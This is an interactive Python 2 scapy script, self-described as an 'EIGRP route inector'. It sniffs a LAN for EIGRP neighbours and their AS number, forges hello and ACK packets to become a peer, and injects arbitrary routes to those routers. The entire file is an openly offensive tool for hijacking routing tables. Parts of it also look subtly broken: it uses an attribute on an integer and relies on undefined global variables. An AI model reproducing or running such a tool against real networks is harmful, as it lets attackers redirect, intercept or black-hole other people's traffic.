#!/usr/bin/env python
import cmd, sys, time, logging
from socket import AF_INET, SOCK_STREAM
import fcntl
import struct
import threading
logging.getLogger("scapy.runtime").setLevel(50)
from scapy.all import *

conf.verb = 0
peers = set()
asnumber = None

    
class inject(threading.Thread):
    def __init__(self, network, netmask):
        self.network = network
        self.netmask = netmask
        threading.Thread.__init__(self)
        
    def run(self):
        global peers
        print peers
        for peer in peers:
            print "Sending route to %s" %peer
            update = Ether()/IP()/EIGRP()
            update.tlvlist = [EIGRPIntRoute()]
            update[2].asn = asnumber.asn
            update[3].nexthop = "0.0.0.0"
            update[3].dst = self.network
            update[1].src = source_ip
            update[1].dst = peer
            update[2].opcode = 1
            update[3].prefixlen = self.netmask
            sendp(update, iface = interface)
        #print "Route injected: %s/%i" %(self.network, self.netmask)

class discover(threading.Thread):
    def __init__(self, interface):
        self.thread_alive = True
        self.interface = interface
        threading.Thread.__init__(self)
    def run(self):
        global peers, asnumber
        while self.thread_alive:
            eigrp_packet = sniff(iface = self.interface, filter = "ip[9:1] == 0x58", count = 1, timeout = 5)
            try:
                if eigrp_packet[0][2].opcode == 5 and eigrp_packet[0][1].src != source_ip:
                    if eigrp_packet[0][1].src not in peers:
                        peers.add(eigrp_packet[0][1].src)
                        asnumber = eigrp_packet[0][2].asn
                        print "\rPeer found: %s AS: %s \r" %(eigrp_packet[0][1].src, eigrp_packet[0][2].asn)
                        print "\rAS set to %i" %asnumber
            except:
                pass
    def exit(self):
        self.thread_alive = False

class say_ack(threading.Thread):
    def __init__(self, asn, interface, source_ip):
        self.thread_alive = True
        self.asn = asn
	self.interface = interface
	self.source_ip = source_ip
        threading.Thread.__init__(self)
    def sendAck(self):
        upd = Ether()/IP()/EIGRP()
        upd[2].asn = self.asn
        upd[1].src = self.source_ip
        upd[1].dst = self.peer
        upd[2].opcode = 1
        upd[2].ack = self.seq
        upd[2].flags = 1L
        sendp(upd, iface = self.interface)    
    def run(self):
        while self.thread_alive:
            update = sniff(iface = self.interface, filter="ip[9:1] == 0x58", count = 1, timeout = 5)
            try:
                if update[0][2].opcode == 1:
                    self.seq = update[0][2].seq
                    #print "Sending ACK, SEQ: %s" %self.seq
                    self.peer = update[0][1].src
                    self.sendAck()
            except:
                pass
    def exit(self):
        self.thread_alive = False

class say_hello(threading.Thread):
    def __init__(self, asn, interface, source_ip):
        self.asn = asn
        self.interface = interface
        self.source_ip = source_ip
        self.thread_alive = True
        threading.Thread.__init__(self)
    def run(self):
        hello = Ether()/IP()/EIGRP()
        hello[2].tlvlist = [EIGRPParam(), EIGRPSwVer()]
        hello[2].asn = self.asn
        hello[1].src = self.source_ip
        hello[1].dst = "224.0.0.10"
        while self.thread_alive:
            asd = sendp(hello, iface = self.interface)
            time.sleep(5)
    def exit(self):
        self.thread_alive = False

class main(cmd.Cmd):
    def __init__(self):
	global peers
	self.peers = peers
        cmd.Cmd.__init__(self)
        self.intro = "EIGRP route inector. Source: google/code"
        self.ack_thread = None
        self.hello_thread = None
        self.discover_thread = None
        self.prompt = socket.gethostname()+"(router-config)#"
        self.interface = None
        self.source_ip = None
        self.sock = socket.socket(AF_INET, SOCK_STREAM)

        
    def do_EOF(self, arg):
        self.do_exit(self)
    def emptyline(self):
        pass
    
    def preloop(self):
        cmd.Cmd.preloop(self)
    
    def do_inject(self, address):
        try:
            self.network = address.split("/",1)[0]
            self.netmask = int(address.split("/",1)[1])
            self.inject_thread = inject(self.network, self.netmask)
            self.inject_thread.start()
        except:
            print "Arg error"
        
    def do_interface(self, interface):
        self.interface = interface
	try:
            self.source_ip = inet_ntoa(fcntl.ioctl(self.sock.fileno(), 0x8915, struct.pack('256s', interface[:15]))[20:24])
            print "Interface set to %s, IP: %s" %(self.interface, self.source_ip)
	except IOError, exc:
	    print "Interface error: %s" %exc
	except:
	    print "Arg error"
    
    def do_asn(self, asn):
        global asnumber
	try:
            asnumber = int(asn)
            print "AS number set to %i" %asnumber
	except:
	    print "Arg error"
   
    def do_peers(self, emp):
	if peers:
	    for peer in peers:
	    	print peer
	else:
	    print "I've got no peers"

    def do_hi(self, args):
        global asnumber
        self.asn = asnumber
        if self.asn:
            if self.interface:
                self.hello_thread = say_hello(self.asn, self.interface, self.source_ip)
                self.ack_thread = say_ack(self.asn, self.interface, self.source_ip)
                self.ack_thread.start()
                self.hello_thread.start()
                print "Hello thread started"
            else:
                print "Define interface"
        elif self.discover_thread:
		print "Can't find any EIGRP processes. Set AS manually"
	else:
            print "Set AS number with \"asn\" or use \"discover\""
    
    def do_discover(self, args):
        if self.interface:
            self.discover_thread = discover(self.interface)
            self.discover_thread.start()
            print "Discovering Peers and AS"
        else:
            print "Set interface"
        

    def do_exit(self, args):
	print "Finishing active threads..."
        if self.hello_thread:
            self.hello_thread.exit()
        if self.ack_thread:
            self.ack_thread.exit()
        if self.discover_thread:
            self.discover_thread.exit()
        exit()

load_contrib("eigrp")
main().cmdloop()